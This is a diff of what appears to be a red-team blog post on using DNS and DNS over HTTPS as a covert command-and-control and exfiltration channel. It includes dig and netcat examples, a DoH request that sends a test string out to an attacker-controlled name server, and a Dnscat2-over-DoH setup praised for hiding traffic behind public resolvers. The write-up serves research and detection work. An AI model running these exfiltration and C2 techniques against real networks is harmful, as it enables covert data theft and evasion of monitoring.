@@ -27,15 +27,40 @@ The [Domain Name System](https://en.wikipedia.org/wiki/Domain_Name_System) is co
 | TXT  | Text Record  | arbitrary text and SPF, DKIM, DMARC, etc   |
 | SOA  | Start of Authority  | Authoritative Name Server for the current DNS zone  |
 
+For example, we can use the following command to resolve the CNAME records of `iwantmore.pizza`:
+
+```text
+root@kali:~$ dig iwantmore.pizza CNAME
+
+; <<>> DiG 9.11.5-1-Debian <<>> iwantmore.pizza CNAME
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5731
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1452
+;; QUESTION SECTION:
+;iwantmore.pizza.		IN	CNAME
+
+;; ANSWER SECTION:
+iwantmore.pizza.	1799	IN	CNAME	phra.github.io.
+
+;; Query time: 10 msec
+;; SERVER: 1.1.1.1#53(1.1.1.1)
+;; WHEN: lun ago 26 10:18:34 CEST 2019
+;; MSG SIZE  rcvd: 72
+```
+
 ## DNS as C2 Channel
 
 If we set up a NS record for `exfil.iwantmore.pizza` pointing to an IP that we control and we try to resolve a subdomain like this:
 
 ```bash
-dig 1234567890.exfil.iwantmore.pizza
+root@kali:~$ dig 1234567890.exfil.iwantmore.pizza
 ```
 
-we will receive the DNS request on port UDP/53:
+we will receive the DNS request on our Authoritative Name Server delegated for the `exfil.` DNS zone:
 
 ```text
 root@kali:~$ nc -lvvup 53
@@ -56,11 +81,11 @@ If you want to tunnel a full-duplex stream instead of exfiltrating a single stri
 
 3. Retransmission of lost packets
 
-You can find an open source [protocol specification](https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md) at the Dnscat2 repository.
+You can find a comprehensive open source [protocol specification](https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md) at the Dnscat2 repository.
 
-## DNS over HTTPS as C2 Channel
+## DNS over HTTPS
 
-We can try it out by issuing a manual request to any DoH public servers using the [official online tool](https://dns.google/query?name=iwantmore.pizza) or locally with cURL, as shown below.
+We can try it out by resolving `iwantmore.pizza` CNAME records and issuing a manual request to any DoH public servers using the [official online tool](https://dns.google/query?name=iwantmore.pizza) or locally with cURL, as shown below.
 
 - Cloudflare:
 
@@ -107,6 +132,8 @@ In all cases, we will receive a JSON response similar to this one:
 }
 ```
 
+## DNS over HTTPS as C2 Channel
+
 To replicate the previous example and exfiltrate the `1234567890` string we simply issue the following command:
 
 ```bash
@@ -126,9 +153,11 @@ connect to [<REDACTED>] from (UNKNOWN) [<REDACTED>] 61832
 1234567890exfiliwantmorepizza)�
 ```
 
+We just have exfiltrated the `1234567890` string using DNS over HTTPS, _i.e._ via a fully encrypted and authenticated HTTP/2 connection to some public, well-known DoH proxy.
+
 ## Dnscat2 over DoH
 
-To quickly confirm that DNS over HTTPS can be really used as a C2 channel, we can configure a DoH proxy and connect the Dnscat2 client to it. In this way we will use the original Dnscat2 client and the proxy will translate the DNS requests to DoH for us. If everything works, only HTTPS traffic to some DoH servers will be seen on the wire. Of course, in a real scenario, the agent itself should contact the public DoH servers directly.
+To quickly confirm that DNS over HTTPS can be reliably used as a C2 channel, we can configure a DoH proxy and connect the Dnscat2 client to it. In this way we will use the original Dnscat2 client and the proxy will translate the DNS requests to DoH for us. If everything works, only HTTPS traffic to some DoH servers will be seen on the wire. Of course, in a real scenario, the agent/implant itself should contact the public DoH servers directly.
 
 We will choose as our DoH proxy [Technitium DNS Server](https://github.com/TechnitiumSoftware/DnsServer), an open source .NET Core implementation.
 
@@ -164,7 +193,7 @@ Now that everything is set up, we can confirm that it is working as expected: le
 
 ## Results
 
-We successfully set up a reverse DNS over HTTPS C2 channel with HTTP/2, High Reputation Domain Fronting and A-grade TLS!
+We successfully set up a reverse DNS over HTTPS C2 channel with HTTP/2, High Reputation Domain Fronting and A-grade TLS support!
 
 - [HTTP/2](https://http2.pro/check?url=https%3A//dns.google/)  
 
